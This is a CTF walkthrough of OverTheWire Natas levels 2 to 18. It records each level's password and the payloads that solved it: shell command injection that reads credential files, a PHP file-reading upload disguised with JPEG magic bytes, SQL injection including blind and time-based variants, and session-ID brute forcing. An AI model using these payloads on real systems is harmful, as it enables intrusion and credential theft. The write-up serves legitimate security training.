# Natas 2

<details>
<summary>Password</summary>

```
username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

</details>
<br/>


# Natas 3

<details>
<summary>Password</summary>

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

</details>
<br/>


# natas 5
<details>
<summary>Password</summary>

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned

bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk
```

</details>
<br/>

# natas 6
`$secret = FOEIUWGHFEEUHOFUOIU`

<details>
<summary>Password</summary>

```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

</details>
<br/>

# natas 7
<details>
<summary>Password</summary>

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

</details>
<br/>

# natas 8
`$secret = oubWYf2kBq`

<details>
<summary>Password</summary>

```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

</details>
<br/>


# natas 9
easy passthru() argument hijacking 

`fff /; cat /etc/natas_webpass/natas10; echo` 

<details>
<summary>Password</summary>

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

</details>
<br/>


# natas 10
still easy passthru() argument hijacking 

`^ /etc/natas_webpass/natas11 \\ echo`

<details>
<summary>Password</summary>

```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

</details>
<br/>


# natas 11
XOR enc is reversible.

Key ^ sample_string = Scramble

Scramble ^ sample_string = key 

Note: XOR key is the repeatable part

`document.cookie = "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5"`

[Python Script](./xor_decode.py)

<details>
<summary>Password</summary>

```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

</details>
<br/>


# natas 12

```html
<input type="hidden" name="filename" value="some.php">
```
```php
<?php
$file = file_get_contents('/etc/natas_webpass/natas13', true);
echo $file;
?>
```

<details>
<summary>Password</summary>

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

</details>
<br/>


# natas 13 

its checking the file signature or the magic byte by  `exif_imagetype()`

can be easily overwritten with xxd.

`{ xxd -r -p <(echo "ffd8ffe000104a46494600010101"); cat upload.php; } > upload-with-img-hdr.php`

with this we have a php file that has a signature of a JPEG file.

<details>
<summary>Password</summary>

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

</details>
<br/>


# natas 14

a very simple SQL Injection 

`" or ""="`

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

<details>
<summary>Password</summary>

```
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

</details>
<br/>


# natas 15 

a bit more advanced SQL Injection

a blind SQL injection using `LIKE BINARY %a` SQL  method to determine the starting sequence of a password 

POST req data:

`username=natas16" AND password LIKE BINARY "test%`

end resulting query : 
```sql 
SELECT * from users where username="natas16" AND password LIKE BINARY "test%"
```

of course this can take a long time so we will be automating that with a simple [Python script](./sql_password_guesser.py)


<details>
<summary>Password</summary>

```
Recovered password (partial if interrupted): hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

</details>
<br/>


# natas 16 

this one is also a grep passthru function, but definitely not so easy,  the  difference is : 

```php

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}

```

with this we literally cannot escape from the grep command, initially i thought that using --include or -f works
but that fails. because we are still parsing that input as a grep arguemnt because of the double quotes, so we cannot use the flags.

the preg_match here forgot to include $ and (), so we can inject some good-old bash. 

```
$(echo hello)

Output:
hello
hello's
hellos

```


and after a bit of research, it turns out its something called a binary oracle. slowly character by character using an inner grep, just like natas 15 , you are using the binary case to guess the password but now the tool is grep instead of SQL. we know the password is in /etc/natas_webpass/natas17


```bash
$(grep ^abc /etc/natas_webpass/natas17)
```

^ says if the password starts with abc, if the inner grep found a result it will output the password, then that password will be
used as an argument passed to the outter grep, so it will print out empty, because grep -i EqjHJbo**** dictionary.txt will definitely results in empty, so we know if the result is empty, we found the correct password combination. 

```bash
grep -i "$(grep ^abc /etc/natas_webpass/natas17)" dictionary.txt
```

32 chars × 62 guesses = ~2000 HTTP requests.

we definitely need python for that, script is [grep-guesser.py](./grep-guesser.py)

<details>
<summary>Password</summary>

```
[.] Recovered Password:  EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

</details>
<br/>


# natas 17

OK lets be honest, at first no one knows what to do here

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
}
```

the echo commands are commented out. so how are we supposed to know? there is an oracle. but this time it isnt Boolean. ITS TIME ITSELF!
apparently you can use SQL SLEEP command (MySQL here). so if we chain the conditions like this:

`natas18" AND IF(password LIKE BINARY "a%", SLEEP(1), 0) -- -`

we can differentiate the responses with Time, here. so in my case the average HTTP Request takes about dt= 0.134s time.
with a 1 second sleep we can know the True statements from fasle here. editing the same python code from natas15.
adding a time checker:
```py
    t0 = time.perf_counter()
    resp = session.post(URL, data={"username": payload}, timeout=10)
    dt = time.perf_counter() - t0
    print("dt=", dt)
    if dt >= 1:
        print("[^] Time Delay signal", dt, prefix)
        return True
```

[Python Script](./sql_password_guesser-with-time.py)


<details>
<summary>Password</summary>

```
Recovered password (partial if interrupted): 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

</details>
<br/>


# natas 18

by reading the [natas18.php](./natas18.php) you can see this is a simply cookie injection process.
each time you log in you will get assigned a random PHPSESSID. the range is from 0-640. by default the user will be assigned normal access and admin variable in session  is set to 0 

the backend code is checking for an alredy set Cookie if it isn't there it'll check the username and password in the Req body, if we supply the cookie ourselves we can bypass the user creation method and act as an already registered user. the session gets loaded in backend and the admin variable is being checked each time. if there isn't any, it'll automatically set it to 0 as well. but we dont want a new user and random PHPSESSID and we certainly need admin variable to be 1. 

so if we keep traversing the PHPSESSID cookie with a loop, we eventually hit the admin PHPSESSID, which will unlock the next level. script is [session-inject.py](./session-inject.py)

<details>
<summary>Password</summary>

```
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

</details>
